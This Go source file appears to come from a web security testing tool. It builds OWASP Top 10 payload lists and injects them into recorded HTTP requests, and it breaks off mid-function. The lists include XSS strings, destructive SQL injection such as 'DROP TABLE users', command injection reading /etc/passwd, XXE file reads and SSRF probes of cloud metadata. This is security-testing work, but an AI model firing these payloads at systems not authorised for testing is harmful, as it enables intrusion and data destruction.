package mutate

import (
	"encoding/json"
	"fmt"
	"net/url"
	"strings"
	"time"

	"github.com/owaspattacksimulator/internal/common"
)

// Mutator handles request mutation for security testing
type Mutator struct {
	payloads map[common.AttackType][]common.Payload
}

// NewMutator creates a new mutator instance
func NewMutator() *Mutator {
	m := &Mutator{
		payloads: make(map[common.AttackType][]common.Payload),
	}
	m.initPayloads()
	return m
}

// initPayloads initializes the attack payloads
func (m *Mutator) initPayloads() {
	// Create base payloads first
	m.createBasePayloads()

	// Then create encoded variations
	m.createEncodedVariations()
}

// createBasePayloads creates the base attack payloads
func (m *Mutator) createBasePayloads() {
	// A01:2021 - Broken Access Control
	m.payloads[common.AttackBrokenAccessControl] = []common.Payload{
		{Type: common.AttackBrokenAccessControl, Value: "/admin", Variant: "admin_access"},
		{Type: common.AttackBrokenAccessControl, Value: "/api/admin", Variant: "api_admin"},
		{Type: common.AttackBrokenAccessControl, Value: "/dashboard", Variant: "dashboard"},
		{Type: common.AttackBrokenAccessControl, Value: "/user/admin", Variant: "user_admin"},
		{Type: common.AttackBrokenAccessControl, Value: "/config", Variant: "config"},
	}

	m.payloads[common.AttackIDOR] = []common.Payload{
		{Type: common.AttackIDOR, Value: "1", Variant: "user_id_1"},
		{Type: common.AttackIDOR, Value: "0", Variant: "user_id_0"},
		{Type: common.AttackIDOR, Value: "999999", Variant: "user_id_high"},
		{Type: common.AttackIDOR, Value: "admin", Variant: "admin_id"},
		{Type: common.AttackIDOR, Value: "true", Variant: "boolean_id"},
		{Type: common.AttackIDOR, Value: "100", Variant: "user_id_100"},
		{Type: common.AttackIDOR, Value: "1000", Variant: "user_id_1000"},
		{Type: common.AttackIDOR, Value: "12345", Variant: "user_id_12345"},
		{Type: common.AttackIDOR, Value: "67890", Variant: "user_id_67890"},
		{Type: common.AttackIDOR, Value: "111111", Variant: "user_id_111111"},
		{Type: common.AttackIDOR, Value: "222222", Variant: "user_id_222222"},
		{Type: common.AttackIDOR, Value: "333333", Variant: "user_id_333333"},
		{Type: common.AttackIDOR, Value: "444444", Variant: "user_id_444444"},
		{Type: common.AttackIDOR, Value: "555555", Variant: "user_id_555555"},
		{Type: common.AttackIDOR, Value: "666666", Variant: "user_id_666666"},
		{Type: common.AttackIDOR, Value: "777777", Variant: "user_id_777777"},
		{Type: common.AttackIDOR, Value: "888888", Variant: "user_id_888888"},
		{Type: common.AttackIDOR, Value: "999999", Variant: "user_id_999999"},
	}

	m.payloads[common.AttackPrivilegeEscalation] = []common.Payload{
		{Type: common.AttackPrivilegeEscalation, Value: "role=admin", Variant: "admin_role"},
		{Type: common.AttackPrivilegeEscalation, Value: "role=superuser", Variant: "superuser_role"},
		{Type: common.AttackPrivilegeEscalation, Value: "isAdmin=true", Variant: "admin_flag"},
		{Type: common.AttackPrivilegeEscalation, Value: "privilege=all", Variant: "all_privileges"},
	}

	m.payloads[common.AttackJWTManipulation] = []common.Payload{
		{Type: common.AttackJWTManipulation, Value: "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.", Variant: "none_alg"},
		{Type: common.AttackJWTManipulation, Value: "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.EGIM96RAZxOHrZcK_RBQUyHXF0pJ9tWcjaBFxsD4UaA", Variant: "weak_secret"},
	}

	// A02:2021 - Cryptographic Failures
	m.payloads[common.AttackWeakCrypto] = []common.Payload{
		{Type: common.AttackWeakCrypto, Value: "md5", Variant: "md5_hash"},
		{Type: common.AttackWeakCrypto, Value: "sha1", Variant: "sha1_hash"},
		{Type: common.AttackWeakCrypto, Value: "des", Variant: "des_encryption"},
		{Type: common.AttackWeakCrypto, Value: "rc4", Variant: "rc4_encryption"},
	}

	m.payloads[common.AttackWeakHashing] = []common.Payload{
		{Type: common.AttackWeakHashing, Value: "5f4dcc3b5aa765d61d8327deb882cf99", Variant: "md5_password"},
		{Type: common.AttackWeakHashing, Value: "40bd001563085fc35165329ea1ff5c5ecbdbbeef", Variant: "sha1_password"},
	}

	m.payloads[common.AttackInsecureTransport] = []common.Payload{
		{Type: common.AttackInsecureTransport, Value: "http://", Variant: "http_protocol"},
		{Type: common.AttackInsecureTransport, Value: "ftp://", Variant: "ftp_protocol"},
		{Type: common.AttackInsecureTransport, Value: "telnet://", Variant: "telnet_protocol"},
	}

	// A03:2021 - Injection
	m.payloads[common.AttackXSS] = []common.Payload{
		{Type: common.AttackXSS, Value: "<script>alert(1)</script>", Variant: "basic"},
		{Type: common.AttackXSS, Value: "\"><img src=x onerror=alert(1)>", Variant: "img_onerror"},
		{Type: common.AttackXSS, Value: "javascript:alert(1)", Variant: "javascript_protocol"},
		{Type: common.AttackXSS, Value: "<svg onload=alert(1)>", Variant: "svg_onload"},
		{Type: common.AttackXSS, Value: "'><script>alert(1)</script>", Variant: "quote_break"},
		{Type: common.AttackXSS, Value: "<iframe src=javascript:alert(1)>", Variant: "iframe"},
		{Type: common.AttackXSS, Value: "';alert(1);//", Variant: "js_injection"},
		{Type: common.AttackXSS, Value: "<script>alert('XSS')</script>", Variant: "alert_xss"},
		{Type: common.AttackXSS, Value: "<script>confirm('XSS')</script>", Variant: "confirm_xss"},
		{Type: common.AttackXSS, Value: "<script>prompt('XSS')</script>", Variant: "prompt_xss"},
		{Type: common.AttackXSS, Value: "<img src=x onerror=alert(1)>", Variant: "img_src_x"},
		{Type: common.AttackXSS, Value: "<body onload=alert(1)>", Variant: "body_onload"},
		{Type: common.AttackXSS, Value: "<input onfocus=alert(1) autofocus>", Variant: "input_onfocus"},
		{Type: common.AttackXSS, Value: "<textarea onblur=alert(1)>", Variant: "textarea_onblur"},
		{Type: common.AttackXSS, Value: "<select onchange=alert(1)>", Variant: "select_onchange"},
		{Type: common.AttackXSS, Value: "<marquee onstart=alert(1)>", Variant: "marquee_onstart"},
		{Type: common.AttackXSS, Value: "<details ontoggle=alert(1)>", Variant: "details_ontoggle"},
		{Type: common.AttackXSS, Value: "<video onloadstart=alert(1)>", Variant: "video_onloadstart"},
		{Type: common.AttackXSS, Value: "<audio oncanplay=alert(1)>", Variant: "audio_oncanplay"},
		{Type: common.AttackXSS, Value: "<form onsubmit=alert(1)>", Variant: "form_onsubmit"},
	}

	m.payloads[common.AttackSQLi] = []common.Payload{
		{Type: common.AttackSQLi, Value: "' OR '1'='1", Variant: "boolean_based"},
		{Type: common.AttackSQLi, Value: "'; WAITFOR DELAY '0:0:5'--", Variant: "time_based"},
		{Type: common.AttackSQLi, Value: "' UNION SELECT NULL--", Variant: "union_based"},
		{Type: common.AttackSQLi, Value: "' AND 1=1--", Variant: "and_based"},
		{Type: common.AttackSQLi, Value: "'; DROP TABLE users--", Variant: "drop_table"},
		{Type: common.AttackSQLi, Value: "' OR 1=1#", Variant: "mysql_comment"},
		{Type: common.AttackSQLi, Value: "' OR 1=1/*", Variant: "mysql_comment_block"},
		{Type: common.AttackSQLi, Value: "' OR 1=1--", Variant: "sql_comment"},
		{Type: common.AttackSQLi, Value: "'; SELECT SLEEP(5)--", Variant: "mysql_sleep"},
		{Type: common.AttackSQLi, Value: "' UNION SELECT 1,2,3--", Variant: "union_columns"},
		{Type: common.AttackSQLi, Value: "' OR 'x'='x", Variant: "string_boolean"},
		{Type: common.AttackSQLi, Value: "'; INSERT INTO users VALUES (1,'hacker')--", Variant: "insert_attack"},
		{Type: common.AttackSQLi, Value: "' OR username='admin'--", Variant: "admin_bypass"},
		{Type: common.AttackSQLi, Value: "'; UPDATE users SET password='hacked'--", Variant: "update_attack"},
		{Type: common.AttackSQLi, Value: "' OR id=1--", Variant: "id_bypass"},
		{Type: common.AttackSQLi, Value: "'; DELETE FROM users--", Variant: "delete_attack"},
		{Type: common.AttackSQLi, Value: "' OR 'a'='a' AND 'b'='b", Variant: "complex_boolean"},
		{Type: common.AttackSQLi, Value: "'; CREATE TABLE hack (id int)--", Variant: "create_table"},
		{Type: common.AttackSQLi, Value: "' OR 1=1 LIMIT 1--", Variant: "limit_bypass"},
		{Type: common.AttackSQLi, Value: "'; ALTER TABLE users ADD COLUMN hack varchar(255)--", Variant: "alter_table"},
	}

	m.payloads[common.AttackCommandInj] = []common.Payload{
		{Type: common.AttackCommandInj, Value: "; cat /etc/passwd", Variant: "file_read"},
		{Type: common.AttackCommandInj, Value: "| whoami", Variant: "command_exec"},
		{Type: common.AttackCommandInj, Value: "`id`", Variant: "backticks"},
		{Type: common.AttackCommandInj, Value: "$(id)", Variant: "dollar_parens"},
		{Type: common.AttackCommandInj, Value: "& dir", Variant: "windows_dir"},
		{Type: common.AttackCommandInj, Value: "|| ping -c 1 127.0.0.1", Variant: "ping_test"},
	}

	m.payloads[common.AttackLDAPInjection] = []common.Payload{
		{Type: common.AttackLDAPInjection, Value: "*)(uid=*))(|(uid=*", Variant: "ldap_injection"},
		{Type: common.AttackLDAPInjection, Value: "admin)(&)", Variant: "ldap_admin"},
		{Type: common.AttackLDAPInjection, Value: "*", Variant: "ldap_wildcard"},
	}

	m.payloads[common.AttackNoSQLInjection] = []common.Payload{
		{Type: common.AttackNoSQLInjection, Value: "{\"$ne\": null}", Variant: "mongo_not_equal"},
		{Type: common.AttackNoSQLInjection, Value: "{\"$gt\": \"\"}", Variant: "mongo_greater"},
		{Type: common.AttackNoSQLInjection, Value: "{\"$where\": \"1==1\"}", Variant: "mongo_where"},
	}

	m.payloads[common.AttackHeaderInjection] = []common.Payload{
		{Type: common.AttackHeaderInjection, Value: "admin\r\nX-Forwarded-For: 127.0.0.1", Variant: "crlf_injection"},
		{Type: common.AttackHeaderInjection, Value: "admin%0d%0aX-Forwarded-For: 127.0.0.1", Variant: "url_encoded_crlf"},
	}

	m.payloads[common.AttackTemplateInjection] = []common.Payload{
		{Type: common.AttackTemplateInjection, Value: "{{7*7}}", Variant: "jinja2"},
		{Type: common.AttackTemplateInjection, Value: "${7*7}", Variant: "freemarker"},
		{Type: common.AttackTemplateInjection, Value: "#{7*7}", Variant: "jsf"},
	}

	// A04:2021 - Insecure Design
	m.payloads[common.AttackBusinessLogicFlaw] = []common.Payload{
		{Type: common.AttackBusinessLogicFlaw, Value: "quantity=-1", Variant: "negative_quantity"},
		{Type: common.AttackBusinessLogicFlaw, Value: "price=0", Variant: "zero_price"},
		{Type: common.AttackBusinessLogicFlaw, Value: "amount=999999999", Variant: "overflow_amount"},
		{Type: common.AttackBusinessLogicFlaw, Value: "discount=200", Variant: "excessive_discount"},
		{Type: common.AttackBusinessLogicFlaw, Value: "balance=-1000", Variant: "negative_balance"},
		{Type: common.AttackBusinessLogicFlaw, Value: "limit=0", Variant: "zero_limit"},
		{Type: common.AttackBusinessLogicFlaw, Value: "count=999999", Variant: "max_count"},
		{Type: common.AttackBusinessLogicFlaw, Value: "status=approved", Variant: "force_approval"},
		{Type: common.AttackBusinessLogicFlaw, Value: "role=admin", Variant: "role_escalation"},
		{Type: common.AttackBusinessLogicFlaw, Value: "permission=all", Variant: "all_permissions"},
	}

	m.payloads[common.AttackRaceCondition] = []common.Payload{
		{Type: common.AttackRaceCondition, Value: "concurrent=true", Variant: "race_condition"},
		{Type: common.AttackRaceCondition, Value: "thread=1", Variant: "thread_id"},
	}

	// A05:2021 - Security Misconfiguration
	m.payloads[common.AttackDefaultCredentials] = []common.Payload{
		{Type: common.AttackDefaultCredentials, Value: "admin:admin", Variant: "admin_admin"},
		{Type: common.AttackDefaultCredentials, Value: "root:root", Variant: "root_root"},
		{Type: common.AttackDefaultCredentials, Value: "admin:password", Variant: "admin_password"},
		{Type: common.AttackDefaultCredentials, Value: "guest:guest", Variant: "guest_guest"},
	}

	m.payloads[common.AttackDebugMode] = []common.Payload{
		{Type: common.AttackDebugMode, Value: "debug=true", Variant: "debug_enabled"},
		{Type: common.AttackDebugMode, Value: "development=true", Variant: "dev_mode"},
		{Type: common.AttackDebugMode, Value: "test=true", Variant: "test_mode"},
	}

	m.payloads[common.AttackVerboseErrors] = []common.Payload{
		{Type: common.AttackVerboseErrors, Value: "error=verbose", Variant: "verbose_errors"},
		{Type: common.AttackVerboseErrors, Value: "debug=1", Variant: "debug_level"},
	}

	m.payloads[common.AttackMissingHeaders] = []common.Payload{
		{Type: common.AttackMissingHeaders, Value: "X-Frame-Options: DENY", Variant: "frame_options"},
		{Type: common.AttackMissingHeaders, Value: "X-Content-Type-Options: nosniff", Variant: "content_type_options"},
		{Type: common.AttackMissingHeaders, Value: "X-XSS-Protection: 1; mode=block", Variant: "xss_protection"},
	}

	m.payloads[common.AttackWeakCORS] = []common.Payload{
		{Type: common.AttackWeakCORS, Value: "Origin: https://evil.com", Variant: "evil_origin"},
		{Type: common.AttackWeakCORS, Value: "Origin: null", Variant: "null_origin"},
		{Type: common.AttackWeakCORS, Value: "Origin: *", Variant: "wildcard_origin"},
	}

	// A06:2021 - Vulnerable and Outdated Components
	m.payloads[common.AttackKnownVulnerability] = []common.Payload{
		{Type: common.AttackKnownVulnerability, Value: "log4j", Variant: "log4shell"},
		{Type: common.AttackKnownVulnerability, Value: "spring4shell", Variant: "spring_vulnerability"},
		{Type: common.AttackKnownVulnerability, Value: "heartbleed", Variant: "openssl_vulnerability"},
	}

	m.payloads[common.AttackOutdatedComponent] = []common.Payload{
		{Type: common.AttackOutdatedComponent, Value: "jquery-1.12.4", Variant: "old_jquery"},
		{Type: common.AttackOutdatedComponent, Value: "bootstrap-3.4.1", Variant: "old_bootstrap"},
		{Type: common.AttackOutdatedComponent, Value: "angular-1.7.9", Variant: "old_angular"},
	}

	m.payloads[common.AttackVersionDisclosure] = []common.Payload{
		{Type: common.AttackVersionDisclosure, Value: "version=1.0.0", Variant: "version_info"},
		{Type: common.AttackVersionDisclosure, Value: "build=2021", Variant: "build_info"},
	}

	// A07:2021 - Identification and Authentication Failures
	m.payloads[common.AttackWeakAuth] = []common.Payload{
		{Type: common.AttackWeakAuth, Value: "password=123456", Variant: "weak_password"},
		{Type: common.AttackWeakAuth, Value: "password=password", Variant: "common_password"},
		{Type: common.AttackWeakAuth, Value: "password=admin", Variant: "admin_password"},
	}

	m.payloads[common.AttackSessionFixation] = []common.Payload{
		{Type: common.AttackSessionFixation, Value: "sessionid=fixed", Variant: "fixed_session"},
		{Type: common.AttackSessionFixation, Value: "token=static", Variant: "static_token"},
	}

	m.payloads[common.AttackSessionTimeout] = []common.Payload{
		{Type: common.AttackSessionTimeout, Value: "timeout=0", Variant: "no_timeout"},
		{Type: common.AttackSessionTimeout, Value: "expires=never", Variant: "never_expires"},
	}

	m.payloads[common.AttackWeakPassword] = []common.Payload{
		{Type: common.AttackWeakPassword, Value: "password=123", Variant: "numeric_password"},
		{Type: common.AttackWeakPassword, Value: "password=abc", Variant: "alpha_password"},
		{Type: common.AttackWeakPassword, Value: "password=123456789", Variant: "sequential_password"},
	}

	m.payloads[common.AttackBruteForce] = []common.Payload{
		{Type: common.AttackBruteForce, Value: "attempt=1000", Variant: "high_attempts"},
		{Type: common.AttackBruteForce, Value: "delay=0", Variant: "no_delay"},
	}

	// A08:2021 - Software and Data Integrity Failures
	m.payloads[common.AttackInsecureDeserialization] = []common.Payload{
		{Type: common.AttackInsecureDeserialization, Value: "O:8:\"stdClass\":0:{}", Variant: "php_object"},
		{Type: common.AttackInsecureDeserialization, Value: "{\"@type\":\"java.util.ArrayList\"}", Variant: "java_object"},
		{Type: common.AttackInsecureDeserialization, Value: "{\"rce\":\"true\"}", Variant: "json_rce"},
	}

	m.payloads[common.AttackCodeInjection] = []common.Payload{
		{Type: common.AttackCodeInjection, Value: "eval('alert(1)')", Variant: "eval_injection"},
		{Type: common.AttackCodeInjection, Value: "exec('whoami')", Variant: "exec_injection"},
		{Type: common.AttackCodeInjection, Value: "system('id')", Variant: "system_injection"},
	}

	m.payloads[common.AttackSupplyChainAttack] = []common.Payload{
		{Type: common.AttackSupplyChainAttack, Value: "package=malicious", Variant: "malicious_package"},
		{Type: common.AttackSupplyChainAttack, Value: "dependency=compromised", Variant: "compromised_dependency"},
	}

	// A09:2021 - Security Logging and Monitoring Failures
	m.payloads[common.AttackLogInjection] = []common.Payload{
		{Type: common.AttackLogInjection, Value: "admin\nadmin", Variant: "log_injection"},
		{Type: common.AttackLogInjection, Value: "admin\r\nadmin", Variant: "log_crlf"},
		{Type: common.AttackLogInjection, Value: "admin%0aadmin", Variant: "log_url_encoded"},
	}

	m.payloads[common.AttackLogBypass] = []common.Payload{
		{Type: common.AttackLogBypass, Value: "logging=false", Variant: "disable_logging"},
		{Type: common.AttackLogBypass, Value: "audit=off", Variant: "disable_audit"},
	}

	m.payloads[common.AttackAuditTrailTampering] = []common.Payload{
		{Type: common.AttackAuditTrailTampering, Value: "timestamp=0", Variant: "zero_timestamp"},
		{Type: common.AttackAuditTrailTampering, Value: "user=anonymous", Variant: "anonymous_user"},
	}

	// A10:2021 - Server-Side Request Forgery
	m.payloads[common.AttackSSRF] = []common.Payload{
		{Type: common.AttackSSRF, Value: "http://127.0.0.1:80/", Variant: "localhost_80"},
		{Type: common.AttackSSRF, Value: "http://127.0.0.1:22/", Variant: "localhost_22"},
		{Type: common.AttackSSRF, Value: "http://169.254.169.254/latest/meta-data/", Variant: "aws_metadata"},
		{Type: common.AttackSSRF, Value: "http://metadata.google.internal/", Variant: "gcp_metadata"},
		{Type: common.AttackSSRF, Value: "http://169.254.169.254/latest/user-data/", Variant: "aws_userdata"},
		{Type: common.AttackSSRF, Value: "http://127.0.0.1:6379/", Variant: "redis"},
		{Type: common.AttackSSRF, Value: "http://127.0.0.1:27017/", Variant: "mongodb"},
		{Type: common.AttackSSRF, Value: "http://127.0.0.1:3306/", Variant: "mysql"},
		{Type: common.AttackSSRF, Value: "http://127.0.0.1:5432/", Variant: "postgresql"},
		{Type: common.AttackSSRF, Value: "http://127.0.0.1:8080/", Variant: "localhost_8080"},
		{Type: common.AttackSSRF, Value: "http://127.0.0.1:3000/", Variant: "localhost_3000"},
		{Type: common.AttackSSRF, Value: "http://127.0.0.1:5000/", Variant: "localhost_5000"},
		{Type: common.AttackSSRF, Value: "http://127.0.0.1:8000/", Variant: "localhost_8000"},
		{Type: common.AttackSSRF, Value: "http://127.0.0.1:9000/", Variant: "localhost_9000"},
		{Type: common.AttackSSRF, Value: "http://10.0.0.1/", Variant: "private_network"},
		{Type: common.AttackSSRF, Value: "http://192.168.1.1/", Variant: "local_network"},
		{Type: common.AttackSSRF, Value: "http://172.16.0.1/", Variant: "docker_network"},
		{Type: common.AttackSSRF, Value: "http://0.0.0.0/", Variant: "all_interfaces"},
		{Type: common.AttackSSRF, Value: "http://localhost/", Variant: "localhost_hostname"},
		{Type: common.AttackSSRF, Value: "http://127.1/", Variant: "localhost_short"},
		{Type: common.AttackSSRF, Value: "http://2130706433/", Variant: "localhost_decimal"},
		{Type: common.AttackSSRF, Value: "http://017700000001/", Variant: "localhost_octal"},
		{Type: common.AttackSSRF, Value: "http://0x7f000001/", Variant: "localhost_hex"},
	}

	m.payloads[common.AttackXXE] = []common.Payload{
		{Type: common.AttackXXE, Value: `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>`, Variant: "file_read"},
		{Type: common.AttackXXE, Value: `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://127.0.0.1:80/">]><foo>&xxe;</foo>`, Variant: "ssrf"},
		{Type: common.AttackXXE, Value: `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">]><foo>&xxe;</foo>`, Variant: "php_filter"},
		{Type: common.AttackXXE, Value: `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://id">]><foo>&xxe;</foo>`, Variant: "expect_protocol"},
	}

	m.payloads[common.AttackOpenRedirect] = []common.Payload{
		{Type: common.AttackOpenRedirect, Value: "https://evil.com", Variant: "external_site"},
		{Type: common.AttackOpenRedirect, Value: "//evil.com", Variant: "protocol_relative"},
		{Type: common.AttackOpenRedirect, Value: "javascript:alert(1)", Variant: "javascript_protocol"},
		{Type: common.AttackOpenRedirect, Value: "data:text/html,<script>alert(1)</script>", Variant: "data_protocol"},
	}
}

// MutateRequest creates mutated versions of a request
func (m *Mutator) MutateRequest(req *common.RecordedRequest) ([]common.RecordedRequest, error) {
	var mutations []common.RecordedRequest

	// Method mutations
	methodMutations := m.mutateMethod(req)
	mutations = append(mutations, methodMutations...)

	// Header mutations
	headerMutations := m.mutateHeaders(req)
	mutations = append(mutations, headerMutations...)

	// Body mutations
	bodyMutations := m.mutateBody(req)
	mutations = append(mutations, bodyMutations...)

	// URL parameter mutations
	urlMutations := m.mutateURL(req)
	mutations = append(mutations, urlMutations...)

	// Combination mutations (multiple injection points)
	combinationMutations := m.createCombinationMutations(req)
	mutations = append(mutations, combinationMutations...)

	return mutations, nil
}

// createCombinationMutations creates mutations that inject payloads into multiple places at once
func (m *Mutator) createCombinationMutations(req *common.RecordedRequest) []common.RecordedRequest {
	var mutations []common.RecordedRequest

	// Get a subset of payloads for combination testing (to avoid too many combinations)
	combinationPayloads := m.getCombinationPayloads()

	for _, payload := range combinationPayloads {
		// Header + URL combination
		mutated := *req
		mutated.ID = generateID()
		mutated.Headers = copyMap(req.Headers)
		mutated.Headers["User-Agent"] = payload.Value
		mutated.Headers["Referer"] = payload.Value

		// Also modify URL
		parsedURL, err := url.Parse(req.URL)
		if err == nil {
			query := parsedURL.Query()
			if len(query) == 0 {
				query.Set("id", "test")
			}
			for key := range query {
				query.Set(key, payload.Value)
			}
			parsedURL.RawQuery = query.Encode()
			mutated.URL = parsedURL.String()
		}

		mutated.Variant = fmt.Sprintf("combination_header_url_%s", payload.Variant)
		mutated.Timestamp = time.Now()
		mutations = append(mutations, mutated)

		// URL + Body combination
		if req.Body != "" {
			mutated2 := *req
			mutated2.ID = generateID()

			// Modify URL
			parsedURL2, err := url.Parse(req.URL)
			if err == nil {
				query2 := parsedURL2.Query()
				if len(query2) == 0 {
					query2.Set("id", "test")
				}
				for key := range query2 {
					query2.Set(key, payload.Value)
				}
				parsedURL2.RawQuery = query2.Encode()
				mutated2.URL = parsedURL2.String()
			}

			// Modify body
			if strings.Contains(req.ContentType, "application/json") {
				var jsonData map[string]interface{}
				if err := json.Unmarshal([]byte(req.Body), &jsonData); err == nil {
					m.injectPayloadIntoJSON(jsonData, payload.Value)
					if mutatedBody, err := json.Marshal(jsonData); err == nil {
						mutated2.Body = string(mutatedBody)
					}
				}
			} else if strings.Contains(req.ContentType, "application/x-www-form-urlencoded") {
				formData, err := url.ParseQuery(req.Body)
				if err == nil {
					for key := range formData {
						formData.Set(key, payload.Value)
					}
					mutated2.Body = formData.Encode()
				}
			}

			mutated2.Variant = fmt.Sprintf("combination_url_body_%s", payload.Variant)
			mutated2.Timestamp = time.Now()
			mutations = append(mutations, mutated2)
		}
	}

	return mutations
}

// getCombinationPayloads returns a subset of payloads for combination testing
func (m *Mutator) getCombinationPayloads() []common.Payload {
	var combinationPayloads []common.Payload

	// Select one payload from each attack type for combination testing
	attackTypes := []common.AttackType{
		common.AttackXSS,
		common.AttackSQLi,
		common.AttackSSRF,
		common.AttackIDOR,
		common.AttackBusinessLogicFlaw,
	}

	for _, attackType := range attackTypes {
		if payloads, exists := m.payloads[attackType]; exists && len(payloads) > 0 {
			// Take the first payload from each attack type
			combinationPayloads = append(combinationPayloads, payloads[0])
		}
	}

	return combinationPayloads
}

// mutateMethod creates method variations
func (m *Mutator) mutateMethod(req *common.RecordedRequest) []common.RecordedRequest {
	methods := []string{"GET", "POST", "PUT", "DELETE", "PATCH", "HEAD", "OPTIONS"}
	var mutations []common.RecordedRequest

	for _, method := range methods {
		if method != req.Method {
			mutated := *req
			mutated.ID = generateID()
			mutated.Method = method
			mutated.Variant = fmt.Sprintf("method_%s", strings.ToLower(method))
			mutated.Timestamp = time.Now()
			mutations = append(mutations, mutated)
		}
	}

	return mutations
}

// mutateHeaders creates header variations
func (m *Mutator) mutateHeaders(req *common.RecordedRequest) []common.RecordedRequest {
	headerInjections := map[string]string{
		"X-Forwarded-For":           "127.0.0.1",
		"X-Forwarded-Host":          "evil.com",
		"X-Original-URL":            "/admin",
		"X-Rewrite-URL":             "/admin",
		"X-Custom-IP-Authorization": "127.0.0.1",
		"X-Forwarded-Server":        "evil.com",
		"X-HTTP-Host-Override":      "evil.com",
		"Forwarded":                 "for=127.0.0.1;by=127.0.0.1;host=evil.com",
	}

	var mutations []common.RecordedRequest

	// Basic header injections
	for header, value := range headerInjections {
		mutated := *req
		mutated.ID = generateID()
		mutated.Headers = copyMap(req.Headers)
		mutated.Headers[header] = value
		mutated.Variant = fmt.Sprintf("header_%s", strings.ToLower(header))
		mutated.Timestamp = time.Now()
		mutations = append(mutations, mutated)
	}

	// Header payload injections
	commonHeaders := []string{"User-Agent", "Referer", "Cookie", "Accept", "Accept-Language", "Accept-Encoding"}

	for _, headerName := range commonHeaders {
		for attackType, payloads := range m.payloads {
			for _, payload := range payloads {
				mutated := *req
				mutated.ID = generateID()
				mutated.Headers = copyMap(req.Headers)
				mutated.Headers[headerName] = payload.Value
				mutated.Variant = fmt.Sprintf("header_%s_%s_%s", strings.ToLower(headerName), attackType, payload.Variant)
				mutated.Timestamp = time.Now()
				mutations = append(mutations, mutated)
			}
		}
	}

	return mutations
}

// mutateBody creates body variations
func (m *Mutator) mutateBody(req *common.RecordedRequest) []common.RecordedRequest {
	var mutations []common.RecordedRequest

	// If no body exists, create basic body mutations for testing
	if req.Body == "" {
		// Create JSON body mutations
		jsonMutations := m.createJSONBodyMutations(req)
		mutations = append(mutations, jsonMutations...)

		// Create XML body mutations
		xmlMutations := m.createXMLBodyMutations(req)
		mutations = append(mutations, xmlMutations...)

		// Create multipart body mutations
		multipartMutations := m.createMultipartBodyMutations(req)
		mutations = append(mutations, multipartMutations...)

		// Create form body mutations
		formMutations := m.createFormBodyMutations(req)
		mutations = append(mutations, formMutations...)

		return mutations
	}

	// JSON body mutations
	if strings.Contains(req.ContentType, "application/json") {
		jsonMutations := m.mutateJSONBody(req)
		mutations = append(mutations, jsonMutations...)
	}

	// Form body mutations
	if strings.Contains(req.ContentType, "application/x-www-form-urlencoded") {
		formMutations := m.mutateFormBody(req)
		mutations = append(mutations, formMutations...)
	}

	// XML body mutations
	if strings.Contains(req.ContentType, "application/xml") || strings.Contains(req.ContentType, "text/xml") {
		xmlMutations := m.mutateXMLBody(req)
		mutations = append(mutations, xmlMutations...)
	}

	// Multipart form data mutations
	if strings.Contains(req.ContentType, "multipart/form-data") {
		multipartMutations := m.mutateMultipartBody(req)
		mutations = append(mutations, multipartMutations...)
	}

	return mutations
}

// createJSONBodyMutations creates JSON body mutations when no body exists
func (m *Mutator) createJSONBodyMutations(req *common.RecordedRequest) []common.RecordedRequest {
	var mutations []common.RecordedRequest

	// Create basic JSON structure
	baseJSON := map[string]interface{}{
		"id":    "test",
		"name":  "test",
		"email": "test@test.com",
		"data":  "test",
	}

	for attackType, payloads := range m.payloads {
		for _, payload := range payloads {
			// Create a copy of the JSON data
			mutatedData := copyJSONMap(baseJSON)

			// Inject payload into string values
			m.injectPayloadIntoJSON(mutatedData, payload.Value)

			// Convert back to JSON
			mutatedBody, err := json.Marshal(mutatedData)
			if err != nil {
				continue
			}

			mutated := *req
			mutated.ID = generateID()
			mutated.Body = string(mutatedBody)
			mutated.ContentType = "application/json"
			mutated.Variant = fmt.Sprintf("json_%s_%s", attackType, payload.Variant)
			mutated.Timestamp = time.Now()
			mutations = append(mutations, mutated)
		}
	}

	return mutations
}

// createXMLBodyMutations creates XML body mutations when no body exists
func (m *Mutator) createXMLBodyMutations(req *common.RecordedRequest) []common.RecordedRequest {
	var mutations []common.RecordedRequest

	// Create basic XML structure
	baseXML := `<?xml version="1.0" encoding="UTF-8"?>
<root>
    <id>test</id>
    <name>test</name>
    <email>test@test.com</email>
    <data>test</data>
</root>`

	for attackType, payloads := range m.payloads {
		for _, payload := range payloads {
			// Replace test values with payload
			mutatedXML := strings.ReplaceAll(baseXML, ">test<", ">"+payload.Value+"<")

			mutated := *req
			mutated.ID = generateID()
			mutated.Body = mutatedXML
			mutated.ContentType = "application/xml"
			mutated.Variant = fmt.Sprintf("xml_%s_%s", attackType, payload.Variant)
			mutated.Timestamp = time.Now()
			mutations = append(mutations, mutated)
		}
	}

	return mutations
}

// createMultipartBodyMutations creates multipart form data mutations
func (m *Mutator) createMultipartBodyMutations(req *common.RecordedRequest) []common.RecordedRequest {
	var mutations []common.RecordedRequest

	for attackType, payloads := range m.payloads {
		for _, payload := range payloads {
			// Create multipart boundary
			boundary := "----WebKitFormBoundary" + generateID()[:8]

			// Create multipart body
			multipartBody := fmt.Sprintf(`--%s
Content-Disposition: form-data; name="id"

%s
--%s
Content-Disposition: form-data; name="name"

%s
--%s
Content-Disposition: form-data; name="email"

%s
--%s
Content-Disposition: form-data; name="data"

%s
--%s--`, boundary, payload.Value, boundary, payload.Value, boundary, payload.Value, boundary, payload.Value, boundary)

			mutated := *req
			mutated.ID = generateID()
			mutated.Body = multipartBody
			mutated.ContentType = "multipart/form-data; boundary=" + boundary
			mutated.Variant = fmt.Sprintf("multipart_%s_%s", attackType, payload.Variant)
			mutated.Timestamp = time.Now()
			mutations = append(mutations, mutated)
		}
	}

	return mutations
}

// createFormBodyMutations creates form body mutations when no body exists
func (m *Mutator) createFormBodyMutations(req *common.RecordedRequest) []common.RecordedRequest {
	var mutations []common.RecordedRequest

	// Create basic form data
	baseForm := url.Values{}
	baseForm.Set("id", "test")
